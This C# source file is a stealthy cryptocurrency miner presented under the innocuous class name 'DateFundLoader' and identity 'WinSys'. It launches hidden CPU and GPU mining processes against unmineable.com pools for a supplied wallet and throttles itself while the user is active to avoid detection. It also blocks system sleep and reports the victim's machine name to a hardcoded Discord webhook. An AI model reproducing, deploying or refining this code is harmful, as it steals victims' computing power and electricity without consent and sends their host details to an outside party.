using System;
using System.Diagnostics;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

public class DateFundLoader {

    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO {
        public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
        [MarshalAs(UnmanagedType.U4)]
        public int cbSize;
        [MarshalAs(UnmanagedType.U4)]
        public uint dwTime;
    }

    [DllImport("user32.dll")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern uint SetThreadExecutionState(uint esFlags);

    private const uint ES_CONTINUOUS = 0x80000000;
    private const uint ES_SYSTEM_REQUIRED = 0x00000001;
    private const uint ES_AWAYMODE_REQUIRED = 0x00000040;

    // Hardcoded identity
    private const string IDENT = "WinSys";
    private const int IDLE_THRESHOLD_MS = 2 * 60 * 1000; // 2 minutes

    public static void StartMiner(string cpuPath, string gpuPath, string wallet) {
        try {
            SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED);
            NotifyDiscord(wallet);

            // One unified manager thread for max clean/insane performance
            Thread manager = new Thread(() => RunManager(cpuPath, gpuPath, wallet));
            manager.IsBackground = true;
            manager.Start();

            Thread.Sleep(Timeout.Infinite);
        } catch { }
    }

    private static void RunManager(string cpuPath, string gpuPath, string wallet) {
        Process cpuProc = null;
        Process gpuProc = null;
        bool wasIdle = false;

        while (true) {
            try {
                bool isIdle = GetIdleTime() > IDLE_THRESHOLD_MS;

                // CPU Dynamic Load Management
                if (isIdle != wasIdle || cpuProc == null || cpuProc.HasExited) {
                    if (cpuProc != null && !cpuProc.HasExited) {
                        try { cpuProc.Kill(); } catch { }
                    }
                    
                    int threads = isIdle ? 100 : 45;
                    string cpuArgs = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.{1}_CPU -p x --donate-level 1 --cpu-max-threads-hint {2}", wallet, IDENT, threads);
                    
                    ProcessStartInfo si = new ProcessStartInfo(cpuPath) {
                        Arguments = cpuArgs,
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    cpuProc = Process.Start(si);
                }

                // GPU Dynamic Load Management (Throttling instead of killing)
                if (!string.IsNullOrEmpty(gpuPath) && File.Exists(gpuPath)) {
                    if (isIdle != wasIdle || gpuProc == null || gpuProc.HasExited) {
                        if (gpuProc != null && !gpuProc.HasExited) {
                            try { gpuProc.Kill(); } catch { }
                        }

                        // Full power (100) when idle, stealth power (40) when active
                        int intensity = isIdle ? 100 : 40;
                        string gpuArgs = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.{1}_GPU --pass x --intensity {2}", wallet, IDENT, intensity);

                        ProcessStartInfo si = new ProcessStartInfo(gpuPath) {
                            Arguments = gpuArgs,
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        };
                        gpuProc = Process.Start(si);
                    }
                }
                
                wasIdle = isIdle;
            } catch { }
            Thread.Sleep(5000);
        }
    }

    private static void NotifyDiscord(string wallet) {
        try {
            string webhookUrl = "https://discord.com/api/webhooks/1495748321078284358/ZrPnFP_wT81nNxuqlsAOB9FNWrOJhK3nPGRYQJjDuH-2mIWdyNf1RK_Ql9Quf6vSgbKr";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string msg = string.Format("🚀 **{0} Worker Online!**\\n**Host:** `{1}`\\n**Mode:** Dynamic (100% Idle / 45% Active)", IDENT, Environment.MachineName);
            using (WebClient wc = new WebClient()) {
                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                wc.UploadString(webhookUrl, "{\"content\": \"" + msg + "\"}");
            }
        } catch { }
    }

    private static uint GetIdleTime() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = Marshal.SizeOf(lii);
        return GetLastInputInfo(ref lii) ? (uint)Environment.TickCount - lii.dwTime : 0;
    }
}
